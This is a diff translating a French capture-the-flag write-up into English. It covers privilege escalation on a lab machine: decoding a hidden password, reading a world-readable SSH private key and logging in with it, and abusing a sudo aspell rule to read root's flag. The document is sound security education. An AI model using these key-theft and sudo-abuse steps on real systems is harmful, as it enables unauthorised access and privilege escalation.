@@ -1,77 +1,77 @@
 # Write-up : "Yer a Wizard #2"
 
-**Cible :** 10.10.0.5 (même machine que "Yer a Wizard, Harry!")
+**Target:** 10.10.0.5 (same machine as "Yer a Wizard, Harry!")
 
-**Objectif :** Escalade de privilèges vers root.txt
+**Objective:** Privilege escalation to root.txt
 
-**Difficulté :** Medium
+**Difficulty:** Medium
 
-**Date :** 15/09/2026
+**Date:** 15/09/2026
 
-**Techniques utilisées :** Abus de permissions de fichiers, décodage hexadécimal, appartenance à un groupe privilégié, vol de clé SSH privée, escalade via sudo (GTFOBins, aspell), décodage multi-couches (hex/Base64/Base32)
+**Techniques used:** File permission abuse, hexadecimal decoding, membership in a privileged group, private SSH key theft, escalation via sudo (GTFOBins, aspell), multi-layer decoding (hex/Base64/Base32)
 
-**Outils utilisés :** cat, chmod, xxd, find, getent, ssh, sudo, grep, base64, base32
+**Tools used:** cat, chmod, xxd, find, getent, ssh, sudo, grep, base64, base32
 
-**Prérequis :** accès SSH en tant que `hagrid` (obtenu dans le write-up "Yer a Wizard, Harry!").
+**Prerequisites:** SSH access as `hagrid` (obtained in the "Yer a Wizard, Harry!" write-up).
 
 ---
 
-## 1. Lecture d'un fichier protégé (abus de permission)
+## 1. Reading a protected file (permission abuse)
 
-Sur le compte `hagrid`, un fichier `riddle.txt` est présent mais illisible. Comme on en est le propriétaire, on peut s'octroyer le droit de lecture :
+On the `hagrid` account, a `riddle.txt` file is present but unreadable. Since we're the owner, we can grant ourselves read access:
 
 ```bash
 ls -la
-chmod u+r riddle.txt   # u = user (moi), r = droit de lecture
+chmod u+r riddle.txt   # u = user (me), r = read permission
 cat riddle.txt
 ```
 
-**Résultat :**
+**Result:**
 
 ```
 Professor dumbledore gave me this riddle, but I don't think I can decipher this.
 He said "take a crack at it, would you?" ...
 ```
 
-suivi d'un gros bloc de lignes hexadécimales.
+followed by a large block of hexadecimal lines.
 
-**Faille exploitée :** mauvaise gestion des permissions, le propriétaire peut se redonner l'accès à un fichier "protégé" (CWE-732).
+**Vulnerability exploited:** poor permission management, the owner can regrant themselves access to a "protected" file (CWE-732).
 
 ---
 
-## 2. Décodage du riddle (hex vers texte)
+## 2. Decoding the riddle (hex to text)
 
-Parmi toutes les lignes hex, l'une décode en texte lisible :
+Among all the hex lines, one decodes into readable text:
 
 ```bash
 echo '496e20666163742c2074686973207761732073696d706c652c207472756c792c207468652070617373776f72642069732042794d65726c696e4265617264210a' | xxd -r -p
 ```
 
-**Résultat :**
+**Result:**
 
 ```
 In fact, this was simple, truly, the password is ByMerlinBeard!
 ```
 
-Mot de passe de dumbledore : `ByMerlinBeard!`
+Dumbledore's password: `ByMerlinBeard!`
 
 ---
 
-## 3. Énumération du groupe privilégié `headmaster`
+## 3. Enumerating the privileged `headmaster` group
 
 ```bash
-id                                   # hagrid appartient au groupe headmaster
-find / -group headmaster 2>/dev/null # fichiers appartenant à ce groupe
-getent group headmaster              # membres du groupe : dumbledore
+id                                   # hagrid belongs to the headmaster group
+find / -group headmaster 2>/dev/null # files belonging to this group
+getent group headmaster              # group members: dumbledore
 ```
 
-**Résultat :** le groupe `headmaster` donne accès aux répertoires `/home/dumbledore/.ssh` et `/home/hagrid/.ssh`, et le membre déclaré est `dumbledore` (uid 1003).
+**Result:** the `headmaster` group grants access to the `/home/dumbledore/.ssh` and `/home/hagrid/.ssh` directories, and the declared member is `dumbledore` (uid 1003).
 
-**Faille exploitée :** groupe aux permissions trop larges donnant accès à des ressources sensibles (CWE-732).
+**Vulnerability exploited:** group with overly broad permissions granting access to sensitive resources (CWE-732).
 
 ---
 
-## 4. Repérage d'une clé SSH lisible
+## 4. Spotting a readable SSH key
 
 ```bash
 ls -la /home/
@@ -80,24 +80,24 @@ ls -la /home/
 # drwx--x--x harry        (711)
 
 ls -la /home/harry/.ssh/
-# -rw-r--r-- 1 harry headmaster ... id_ed25519       (clé privée lisible par tous)
+# -rw-r--r-- 1 harry headmaster ... id_ed25519       (private key readable by everyone)
 # -rw-r--r-- 1 harry headmaster ... id_ed25519.pub
 # -rw-r--r-- 1 harry headmaster ... authorized_keys
 ```
 
-`711` (`drwx--x--x`) : on peut traverser le dossier `harry` (bit `x`) même sans droit de lecture (`r`), ce qui permet d'atteindre `.ssh/` directement.
+`711` (`drwx--x--x`): we can traverse the `harry` folder (`x` bit) even without read permission (`r`), which lets us reach `.ssh/` directly.
 
-**Faille exploitée :** clé privée SSH world-readable (CWE-732 / CWE-522).
+**Vulnerability exploited:** world-readable private SSH key (CWE-732 / CWE-522).
 
 ---
 
-## 5. Vol de la clé privée de harry et connexion SSH
+## 5. Stealing harry's private key and SSH login
 
 ```bash
 cat /home/harry/.ssh/id_ed25519
 ```
 
-On recopie la clé dans un fichier local :
+We copy the key into a local file:
 
 ```bash
 cat > /tmp/harry_key <<'EOF'
@@ -110,57 +110,57 @@ AAAEAXghR8ct70B3lWRBxSLqDai2Q+wFphPdtXN5pYQ98QAWx+lfv77W/zRaaUySDBtyjV
 -----END OPENSSH PRIVATE KEY-----
 EOF
 
-chmod 600 /tmp/harry_key      # ssh refuse une clé avec des permissions trop ouvertes
+chmod 600 /tmp/harry_key      # ssh refuses a key with overly open permissions
 ssh -i /tmp/harry_key harry@localhost
 ```
 
-- `-i` = utilise la clé au lieu d'un mot de passe.
+- `-i` = use the key instead of a password.
 
-**Résultat :** connexion réussie en tant que harry (`id` le confirme).
+**Result:** successful connection as harry (`id` confirms it).
 
 ---
 
-## 6. Escalade de privilèges via sudo (aspell)
+## 6. Privilege escalation via sudo (aspell)
 
 ```bash
 sudo -l
 ```
 
-**Résultat :**
+**Result:**
 
 ```
 User harry may run the following commands on hogwarts:
     (root) NOPASSWD: /usr/bin/aspell
 ```
 
-On peut lancer `aspell` en root sans mot de passe.
+We can run `aspell` as root without a password.
 
-**Faille exploitée :** règle sudo permissive sur un binaire détournable (CWE-269, technique GTFOBins).
+**Vulnerability exploited:** permissive sudo rule on a hijackable binary (CWE-269, GTFOBins technique).
 
-`aspell` lit un fichier de config et affiche son contenu dans un message d'erreur. On lui fait lire `/root/root.txt` :
+`aspell` reads a config file and displays its content in an error message. We make it read `/root/root.txt`:
 
 ```bash
 sudo aspell --conf /root/root.txt
 # Error: /root/root.txt:1: The key "53565a4a...3d3d" is unknown.
 ```
 
-Une longue chaîne hexadécimale s'affiche.
+A long hexadecimal string is displayed.
 
 ---
 
-## 7. Décodage du flag (hex vers Base64 vers Base32)
+## 7. Decoding the flag (hex to Base64 to Base32)
 
 ```bash
 sudo aspell --conf /root/root.txt 2>&1 | grep -oE '[0-9a-f]{20,}' | xxd -r -p | base64 -d | base32 -d ; echo
 ```
 
-- `2>&1` = récupère le message d'erreur
-- `grep -oE '[0-9a-f]{20,}'` = extrait la longue chaîne hex
-- `xxd -r -p` = hex vers Base64
-- `base64 -d` = Base64 vers Base32
-- `base32 -d` = Base32 vers texte clair
+- `2>&1` = captures the error message
+- `grep -oE '[0-9a-f]{20,}'` = extracts the long hex string
+- `xxd -r -p` = hex to Base64
+- `base64 -d` = Base64 to Base32
+- `base32 -d` = Base32 to plaintext
 
-**FLAG obtenu :**
+**FLAG obtained:**
 
 ```
 EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}
@@ -168,33 +168,33 @@ EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}
 
 ---
 
-## Résumé des failles exploitées
+## Summary of exploited vulnerabilities
 
-| # | Faille | Catégorie (CWE) |
+| # | Vulnerability | Category (CWE) |
 | --- | --- | --- |
-| 1 | Fichier "protégé" modifiable par son propriétaire | CWE-732 |
-| 2 | Groupe `headmaster` aux permissions trop larges | CWE-732 |
-| 3 | Clé privée SSH world-readable | CWE-522 |
-| 4 | Dossier en 711 traversable (accès direct à .ssh) | CWE-732 |
-| 5 | sudo `NOPASSWD` sur `aspell` (GTFOBins) | CWE-269 |
+| 1 | "Protected" file modifiable by its owner | CWE-732 |
+| 2 | `headmaster` group with overly broad permissions | CWE-732 |
+| 3 | World-readable private SSH key | CWE-522 |
+| 4 | 711 traversable folder (direct access to .ssh) | CWE-732 |
+| 5 | sudo `NOPASSWD` on `aspell` (GTFOBins) | CWE-269 |
 
 ---
 
-## Résumé des étapes
+## Summary of steps
 
-1. Compte hagrid : `chmod u+r riddle.txt`, décodage hex, mot de passe de dumbledore.
-2. Groupe headmaster : accès aux dossiers `.ssh`.
-3. Clé privée de harry lisible (`id_ed25519`).
-4. `ssh -i harry_key harry@localhost` : compte harry.
-5. `sudo -l` : `(root) NOPASSWD: /usr/bin/aspell`.
-6. `sudo aspell --conf /root/root.txt`, puis décodage hex/base64/base32 : le flag root.
+1. hagrid account: `chmod u+r riddle.txt`, hex decoding, dumbledore's password.
+2. headmaster group: access to `.ssh` folders.
+3. harry's private key readable (`id_ed25519`).
+4. `ssh -i harry_key harry@localhost`: harry account.
+5. `sudo -l`: `(root) NOPASSWD: /usr/bin/aspell`.
+6. `sudo aspell --conf /root/root.txt`, then hex/base64/base32 decoding: the root flag.
 
 ---
 
 ## Conclusion
 
-- **Point de départ :** compte `hagrid` (issu de "Yer a Wizard, Harry!").
-- **Pivot 1 :** décodage d'un riddle hex (mot de passe), puis exploitation du groupe `headmaster` pour lire la clé SSH de `harry`.
-- **Pivot 2 :** connexion SSH en `harry` via sa clé privée mal protégée.
-- **Escalade root :** `sudo aspell` (GTFOBins) pour lire `/root/root.txt`, puis décodage hex/Base64/Base32.
-- **Flag root :** `EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}`
+- **Starting point:** `hagrid` account (from "Yer a Wizard, Harry!").
+- **Pivot 1:** decoding a hex riddle (password), then exploiting the `headmaster` group to read `harry`'s SSH key.
+- **Pivot 2:** SSH login as `harry` via his poorly protected private key.
+- **Root escalation:** `sudo aspell` (GTFOBins) to read `/root/root.txt`, then hex/Base64/Base32 decoding.
+- **Root flag:** `EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}`
